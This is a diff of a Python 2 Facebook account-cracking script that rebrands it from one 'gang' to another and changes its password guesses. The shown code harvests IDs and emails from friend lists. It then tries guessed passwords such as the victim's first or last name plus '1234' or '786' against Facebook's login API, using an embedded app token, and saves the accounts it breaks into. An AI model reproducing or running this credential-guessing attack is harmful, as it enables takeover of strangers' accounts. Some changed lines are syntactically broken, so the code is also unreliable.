@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # coding=utf-8
-# Originally Written By:Muhammad Hamza
+# Originally Written By:USMI CREATION
 # Source : Python2"
 # Donot Recode It. 
 
@@ -13,7 +13,7 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 jam.py')
+    os.system('python2 USMI.py')
 
 #Browser Setting
 reload(sys)
@@ -58,17 +58,17 @@ def hopss(z):
 		time.sleep(0.1)
 ##### LOGO #####
 banner = """
-\033[1;92m___  ____   _ _____ _   __  ___   _   _ 
-\033[1;92m|  \/  | | | /  ___| | / / / _ \ | \ | |
-\033[1;92m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
-\033[1;92m| |\/| | | | |`--. \    \ |  _  || . ` |
-\033[1;92m| |  | | |_| /\__/ / |\  \| | | || |\  |
-\033[1;92m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/                                               
+\033[1;92m██╗   ██╗███████╗███╗   ███╗██╗
+\033[1;92m██║   ██║██╔════╝████╗ ████║██║
+\033[1;92m██║   ██║███████╗██╔████╔██║██║
+\033[1;92m██║   ██║╚════██║██║╚██╔╝██║██║
+\033[1;92m╚██████╔╝███████║██║ ╚═╝ ██║██║
+\033[1;92m ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝                                         
 \033[1;97m-----------------------------------------------
-\033[1;91m➣ OWNER   : JAM SHAHRUKH X MUSKAN NOOR
-\033[1;91m➣ Github  : https://github.com/muskanckg
-\033[1;91m➣ GANG    : CRAZY KING GANG
-\033[1;91m➣ Youtube : JAM SHAHRUKH TECHNICAL
+\033[1;91m➣ OWNER   : USMI CREATION
+\033[1;91m➣ Github  : https://github.com/UsmiCreation
+\033[1;91m➣ GANG    : AK GANG
+\033[1;91m➣ Youtube : USMI CREATION
 \033[1;97m-----------------------------------------------"""
 # titik #
 def tik():
@@ -97,7 +97,7 @@ def menu():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -108,11 +108,11 @@ def menu():
 		print"[!] Account Is On Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	except requests.exceptions.ConnectionError:
 		print"[!] No Connection"
 		time.sleep(1)
-		('python2 hop.py')
+		('python2 USMI.py')
 	os.system("clear")
 	print banner
 	print "|[✓] Name: "+name
@@ -160,12 +160,12 @@ def men():
 		time.sleep(3)
 		os.hamza('python2 jam.py')
 	elif rana =="6":
-		os.system('xdg-open https://www.facebook.com/jam.shahrukh124')
+		os.system('xdg-open https://www.facebook.com/100010703370182')
 		menu()
 	elif rana =="7":
 		os.system('rm -rf login.txt')
 		hamza('[✓] Logged Out Successfully')
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	else:
 		print "[!] Wrong Input"
 		men()
@@ -180,7 +180,7 @@ def crack():
 		print"Token invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	os.system('clear')
 	print banner
 	print "[1] Clone From Friendlist."
@@ -273,7 +273,7 @@ def crack_menu():
 					crt.close()
 					checkpoint.append(user+pass1)
 				else:
-					pass2 = 'pubgqueen'
+					pass2 = 'Pakistan'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
@@ -287,7 +287,7 @@ def crack_menu():
 							crt.close()
 							checkpoint.append(user+pass2)
 						else:
-							pass3 = 'pubgking'
+							pass3 =b['first_name'] + '1234'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
@@ -301,7 +301,7 @@ def crack_menu():
 									crt.close()
 									checkpoint.append(user+pass3)
 								else:
-									pass4 = 'Pubg123'
+									pass4 =b['last_name'] + '1234'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
@@ -315,7 +315,7 @@ def crack_menu():
 											crt.close()
 											checkpoint.append(user+pass4)
 										else:
-											pass5 = 'Pubgking'
+											pass5 =b['first_name'] + '12345'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if "access_token" in q:
@@ -328,8 +328,8 @@ def crack_menu():
 													crt.write(user+"|"+pass5+"\n")
 													crt.close()
 													checkpoint.append(user+pass5)
-												else:
-													pass6 = 'Pubgqueen'
+												else
+													pass6 =b['last_name'] + '12345'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if "access_token" in q:
@@ -343,7 +343,7 @@ def crack_menu():
 															crt.close()
 															checkpoint.append(user+pass6)
 														else:
-															pass7 = 'Pubg786'
+															pass7 =b['first_name'] + '786'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
@@ -388,7 +388,7 @@ def grab():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	os.system('clear')
 	print banner
 	print "[1] Extract Numeric IDs From Public ID."
@@ -427,7 +427,7 @@ def idfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		('python2 jam.py')
+		('python2 USMI.py')
 	try:
 		os.mkdir('save')
 	except OSError:
@@ -486,7 +486,7 @@ def emailfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	try:
 		os.mkdir('save')
 	except OSError:
@@ -618,7 +618,7 @@ def bot():
 		print"[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	os.system('clear')
 	print banner
 	print "[1] Auto Delete Posts."
@@ -659,7 +659,7 @@ def deletepost():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	os.system('clear')
 	print banner
 	print("[✓] Account Name : "+nama)
@@ -696,7 +696,7 @@ def accept():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	os.system('clear')
 	print banner
 	limit = raw_input("[+] Enter Limit To Accept Requests : ")
@@ -729,7 +729,7 @@ def unfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		os.system('python2 USMI.py')
 	os.system('clear')
 	print banner
 	hamza('[✓] The Process Has Been Started.')
